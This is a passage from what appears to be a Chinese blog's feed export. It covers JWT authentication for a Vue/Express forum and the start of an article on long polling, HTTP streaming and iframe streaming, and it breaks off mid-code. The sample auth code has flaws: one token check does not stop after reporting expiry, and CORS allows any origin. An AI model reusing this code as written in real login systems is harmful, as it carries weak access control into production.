class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">created()&#123;</span><br><span class="line">      <span class="keyword">var</span> token = localStorage.getItem(<span class="string">"token"</span>);</span><br><span class="line">      <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">      <span class="keyword">var</span> content = <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">            access_token:token</span><br><span class="line">          &#125;)</span><br><span class="line">      <span class="keyword">if</span>(token)&#123;</span><br><span class="line">        fetch(<span class="string">'http://localhost:3000/user'</span>,&#123;</span><br><span class="line">          method:<span class="string">'POST'</span>,</span><br><span class="line">          headers: &#123;</span><br><span class="line">                      <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">                      <span class="string">"Content-Length"</span>: content.length.toString(),</span><br><span class="line">                    &#125;,</span><br><span class="line">          body: content</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">            res.json().then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(data.user.name);</span><br><span class="line">              _this.user = data.user;</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _this.user = <span class="literal">undefined</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.user = <span class="literal">undefined</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>登录</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">handleLog()&#123;</span><br><span class="line">    <span class="keyword">let</span> _this = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> content = <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">            name:_this.name,</span><br><span class="line">            password:_this.password</span><br><span class="line">        &#125;);</span><br><span class="line">    fetch(<span class="string">'http://localhost:3000/log'</span>,&#123;</span><br><span class="line">        method:<span class="string">'POST'</span>,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">            <span class="string">"Content-Length"</span>: content.length.toString(),</span><br><span class="line">        &#125;,</span><br><span class="line">        body: content</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">                res.json().then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                localStorage.setItem(<span class="string">"token"</span>,data.token);</span><br><span class="line">                _this.user = data.user;</span><br><span class="line">                _this.$dispatch(<span class="string">'log'</span>,data.user);</span><br><span class="line">                _this.$router.go(<span class="string">'/'</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                _this.user = <span class="literal">undefined</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注册与登录类似</p><p><strong>退出登录</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logOut(e)&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    localStorage.removeItem(<span class="string">"token"</span>);</span><br><span class="line">    <span class="keyword">this</span>.$dispatch(<span class="string">"logOut"</span>);</span><br><span class="line">    <span class="keyword">this</span>.$router.go(<span class="string">"/"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>发表文章</strong></p><p>需带上Token<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">handlePost()&#123;</span><br><span class="line">    <span class="keyword">let</span> _this = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> content = <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">            access_token:localStorage.getItem(<span class="string">"token"</span>),</span><br><span class="line">            title:_this.title,</span><br><span class="line">            content:_this.content</span><br><span class="line">        &#125;);</span><br><span class="line">    fetch(<span class="string">'http://localhost:3000/post'</span>,&#123;</span><br><span class="line">        method:<span class="string">'POST'</span>,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">            <span class="string">"Content-Length"</span>: content.length.toString(),</span><br><span class="line">        &#125;,</span><br><span class="line">        body: content</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(res.ok)&#123;  </span><br><span class="line">                _this.$router.go(<span class="string">'/'</span>);</span><br><span class="line">                <span class="built_in">window</span>.location.reload();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="built_in">console</span>.log(<span class="string">"发表文章失败"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>路由权限访问限制</strong></p><p>对于没有登录/注册的，不允许访问/post路由;</p><p>对于已经登录的不允许访问/log和/reg路由;</p><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p><strong>登录/注册成功生成Token的API</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> expires = moment().add(<span class="number">7</span>,<span class="string">'days'</span>).valueOf();</span><br><span class="line"><span class="keyword">var</span> token = jwt.encode(&#123;</span><br><span class="line">    iss: <span class="string">'admin'</span>,</span><br><span class="line">    exp: expires,</span><br><span class="line">user: newUser.name</span><br><span class="line">&#125;, req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">res.status(<span class="number">200</span>);</span><br><span class="line">res.json(&#123;</span><br><span class="line">    token : token,</span><br><span class="line">    expires: expires,</span><br><span class="line">    user:&#123;</span><br><span class="line">            name:user.name</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><strong>根据Token提供User信息的API</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = req.body.access_token;</span><br><span class="line"><span class="keyword">if</span>(token)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> decoded = jwt.decode(token,req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">        <span class="keyword">if</span>(decoded.exp &lt; <span class="built_in">Date</span>.now())&#123;</span><br><span class="line">            res.end(<span class="string">'token expired'</span>,<span class="number">401</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//console.log(decoded)</span></span><br><span class="line">        res.status(<span class="number">200</span>);</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            user:&#123;</span><br><span class="line">                name:decoded.user</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        res.status(<span class="number">401</span>);</span><br><span class="line">        res.send(<span class="string">'no token'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>验证Token的发布文章API</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = req.body.access_token;</span><br><span class="line">    <span class="keyword">if</span>(token)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> decoded = jwt.decode(token,req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">            <span class="keyword">if</span>(decoded.exp &lt; <span class="built_in">Date</span>.now())&#123;</span><br><span class="line">                res.end(<span class="string">'token expired'</span>,<span class="number">401</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">            res.send(<span class="number">401</span>);</span><br><span class="line">            res.end();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> newPost = <span class="keyword">new</span> Post(&#123;</span><br><span class="line">            name:decoded.user,</span><br><span class="line">            title:req.body.title,</span><br><span class="line">            content:req.body.content</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(newPost);</span><br><span class="line">        newPost.save(<span class="function"><span class="keyword">function</span>(<span class="params">err,post</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"发表文章失败"</span>);</span><br><span class="line">                res.status(<span class="number">500</span>);</span><br><span class="line">                res.send(&#123;<span class="attr">error</span>:<span class="number">1</span>&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'发表文章成功'</span>);</span><br><span class="line">                res.status(<span class="number">200</span>);</span><br><span class="line">                res.end();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//console.log(post);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        res.status(<span class="number">401</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>跨域设置</strong></p><p>由于要在客户端服weppack sever中访问API,需解决跨域限制:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.all(<span class="string">"*"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">  res.header(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">  res.header(<span class="string">'Access-Control-Allow-Headers'</span>, <span class="string">'Content-Type, Content-Length, Authorization, Accept, X-Requested-With'</span>);</span><br><span class="line">  res.header(<span class="string">"Access-Control-Allow-Methods"</span>,<span class="string">"PUT,POST,GET,DELETE,OPTIONS"</span>);</span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>JWT是一种OAuth2.0标准的Access_Token的具体实现方案，可以通过Authorization Bearer,url查询字符串，异步请求的req.body等方式向服务端发送JWT token, 其不依赖于Cookie,有效避免了CSRF攻击，其无状态性可以方便我们编写公共API，此种方案，更加符合RESTFUL API设计理念,在前后端分离实践中发挥着重要的作用。</p><p><strong>永远把自己当做一个beginner,保持好奇心</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;JWT是一种用于双方之间传递安全信息的简洁的、URL安全的表述性声明规范。JWT作为一个开放的标准（ RFC 7519 ），定义了一种简洁的，自包含的方法用于通信双方之间以Json对象的形式安全的传递信息。因为数字签名的存在，这些信息是可信的，JWT可以使用HMAC算法或者是RSA的公私秘钥对进行签名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之前发表了一篇关于session相关的文章，当时也说明了session这种方式的一些问题，主要就是一个安全性问题。而作为OAuth标准的Access_Token具体解决方案之一的JWTs,使得一些问题得到很好的解决。&lt;/p&gt;
&lt;p&gt;文章主要介绍JWT的相关知识以及Nodejs中的JWT,最后，以一个我最近写的论坛为实例，总结一下我在前后端完全分离方面的实践。&lt;/p&gt;
&lt;p&gt;论坛采用Vue+express+mongodb开发，不断完善ing,欢迎访问github项目地址star:&lt;a href=&quot;https://github.com/laoqiren/vue-express-forum&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/laoqiren/vue-express-forum&lt;/a&gt;,论坛在线地址:&lt;a href=&quot;http://120.77.38.217:3000&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://120.77.38.217:3000&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/UfIbUjj.png&quot; alt=&quot;JWT&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="JWTs" scheme="http://luoxia.me/code/tags/JWTs/"/>
    
      <category term="OAuth" scheme="http://luoxia.me/code/tags/OAuth/"/>
    
      <category term="前端工程" scheme="http://luoxia.me/code/tags/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>数据推送业务解决方案</title>
    <link href="http://luoxia.me/code/2016/10/16/%E6%95%B0%E6%8D%AE%E6%8E%A8%E9%80%81%E4%B8%9A%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://luoxia.me/code/2016/10/16/数据推送业务解决方案/</id>
    <published>2016-10-16T04:50:59.000Z</published>
    <updated>2017-11-16T13:10:06.492Z</updated>
    
    <content type="html"><![CDATA[<p>数据推送业务场景非常之多，如股票信息实时推送，赛事实时直播，IM（即时）通信如QQ,WeChat等。</p><p>在6月份我发表过一篇关于socket.io的文章，当时介绍过：</p><blockquote><p>Socket.IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket.IO实现的Polling通信机制包括Adobe Flash Socket、AJAX长轮询、AJAX multipart streaming、持久Iframe、JSONP轮询等。Socket.IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。</p></blockquote><p>WebSocket通信协议非常棒，但是有一些场景，WebSocket这种方案不是最佳的。而且考虑到兼容性的问题，在浏览器不支持WebSocket的情况下，需要通过hack，利用其它解决方案来解决问题。</p><p>所以，对于不同的应用场景，需要从各方面考虑，诸如成本，兼容，用户体验等，来选择最佳解决方案。</p><p><strong>文章目录:</strong>（整个发展过程为数据拉取到数据推送，再到全双工通信）</p><ol><li>简单粗暴的短轮询（数据拉取）</li><li>进化的长轮询（long Polling)</li><li>HTTP流</li><li>Iframe流</li><li>SSE（服务器推送事件)</li><li>SSE与WebSocket对比分析</li><li>适用场景分析</li></ol><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>B/S架构与C/S架构的一大不同点就是多态设备的通讯方式，传统的C/S架构通过Socket便可轻松进行实时通讯，但是B/S架构就需要经过服务器一层来实现。</p><p>Web世界在不断变化，技术也在不断进步。从最初的用户体验极差的定时刷新方式，到数据拉取，到服务器推送，再到全双工通信。。。</p><h3 id="简单粗暴的短轮询（数据拉取）"><a href="#简单粗暴的短轮询（数据拉取）" class="headerlink" title="简单粗暴的短轮询（数据拉取）:"></a>简单粗暴的短轮询（数据拉取）:</h3><p>所谓短轮询，即客户端定时向服务器发送异步请求，获取数据，不管服务端数据有没有变化，客户端都会发起请求，来更新view。</p><p>可见方式太多无谓的浪费，也不能确保数据的即时性。其技术实现非常简单。这里不详解。</p><h3 id="进化的长轮询-long-Polling"><a href="#进化的长轮询-long-Polling" class="headerlink" title="进化的长轮询(long Polling)"></a>进化的长轮询(long Polling)</h3><p>长轮询与短轮询不一样的是，客户端发送请求后，服务端不会立即返回数据，连接不会立即断开，而是服务端数据有更新时，才将数据发送到客户端，客户端再端口连接，然后客户端又立即产生新的连接，如此反复，从而获取最新数据。</p><h4 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h4><p><strong>客户端:</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">'get'</span>,<span class="string">'http://localhost:8088/'</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"新数据:"</span> + xhr.response);</span><br><span class="line">            getNewData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send(<span class="literal">null</span>)</span><br><span class="line">&#125;</span><br><span class="line">getNewData();</span><br></pre></td></tr></table></figure></p><p><strong>服务端node</strong>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> urlLib = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123;</span><br><span class="line">        res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">            <span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        setInterval(<span class="function"><span class="params">()</span>=&gt;</span>sendData(res),<span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendData</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> randomNum=<span class="built_in">Math</span>.floor(<span class="number">10</span>*<span class="built_in">Math</span>.random());</span><br><span class="line">    <span class="keyword">if</span>(randomNum&gt;=<span class="number">0</span>&amp;&amp;randomNum&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">        res.end(<span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server on 8088'</span>);</span><br></pre></td></tr></table></figure></p><p>我们在接受到数据后，再次调用函数自身，这样可以做到不断地建立新连接。</p><p><strong>效果</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/longPollingClient.png" alt=""></p><p><strong>查看请求情况</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/LongPolling.png" alt=""></p><p>一个连接断开后，就有新的连接产生。</p><p><strong>不足</strong></p><p>不断发起请求的消耗</p><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流:"></a>HTTP流:</h3><p>HTTP流，即HTTP长连接，客户端与服务端只有单一的一条http连接，服务端数据通过流的方式不断地发送到客户端，而客户端通过监听xhr对象的readystatechage事件，获取数据。</p><p><strong>注意要设置http响应MIME类型为”multipart/mixed”,不然是无法通过片段形式读取数据的。</strong></p><h4 id="技术实现-1"><a href="#技术实现-1" class="headerlink" title="技术实现"></a>技术实现</h4><p><strong>客户端</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> received = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'get'</span>,<span class="string">'http://localhost:8088/'</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'state changed'</span>)</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState == <span class="number">3</span>)&#123;</span><br><span class="line">        result = xhr.response.substring(received);</span><br><span class="line">        received += result.length;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'接受到数据：'</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p><p><strong>服务端node</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'connect'</span>)</span><br><span class="line">        res.writeHead(<span class="number">200</span>,&#123;<span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span>,<span class="string">'Content-Type'</span>:<span class="string">'multipart/mixed'</span>&#125;);</span><br><span class="line">        setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            res.write(<span class="string">'hello'</span>);</span><br><span class="line">        &#125;,<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br></pre></td></tr></table></figure></p><p><strong>效果如图</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/HttpStream.png" alt=""></p><p><strong>不足</strong></p><p>服务器维持长连接的资源消耗，且浏览器对于长连接数有限制</p><h3 id="Iframe流"><a href="#Iframe流" class="headerlink" title="Iframe流"></a>Iframe流</h3><p>在IE的低版本浏览器中，是不支持在readystate变化为4之前读取response对象的，所以就没办法使用Http流,另一种解决方案是利用Iframe作为桥梁来解决：</p><p><strong>客户端</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">"接受到新数据:"</span> + data);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">   process(event.data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dataStream = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>),timer;</span><br><span class="line">    ifr.src = url;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"container"</span>).appendChild(ifr);</span><br><span class="line">&#125;;</span><br><span class="line">dataStream(<span class="string">"http://localhost:8088/"</span>);</span><br></pre></td></tr></table></figure><p><strong>服务端</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123;</span><br><span class="line">        res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">            <span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>:<span class="string">'text/html'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">var</span> timer=setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            sendDate(timer,res);</span><br><span class="line">        &#125;,<span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendDate</span>(<span class="params">timer,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> randomNum=<span class="built_in">Math</span>.floor(<span class="number">10000</span>*<span class="built_in">Math</span>.random());</span><br><span class="line">    res.write(<span class="string">"&lt;script type=\"text/javascript\"&gt;parent.postMessage('"</span> + <span class="string">"data:"</span> + randomNum.toString() + <span 